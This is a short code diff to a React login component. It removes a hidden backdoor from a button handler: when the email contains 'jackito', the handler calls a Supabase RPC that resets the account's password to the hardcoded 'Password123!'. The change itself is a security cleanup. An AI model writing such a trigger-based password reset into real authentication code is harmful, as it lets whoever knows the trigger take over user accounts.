@@ -506,15 +506,9 @@ const Login: React.FC<LoginProps> = ({ onLogin, onReset }) => {
 
                           <button 
                             type="button"
-                            onClick={async () => {
+                            onClick={() => {
                               try {
                                 clearFailedAttempts(email);
-                                if (email.toLowerCase().includes('jackito')) {
-                                  await supabase.rpc('emergency_reset_password', {
-                                    p_email: email,
-                                    p_new_password: 'Password123!'
-                                  });
-                                }
                                 setError(null);
                                 window.localStorage.removeItem(getAttemptsKey(email));
                               } catch(e) {}
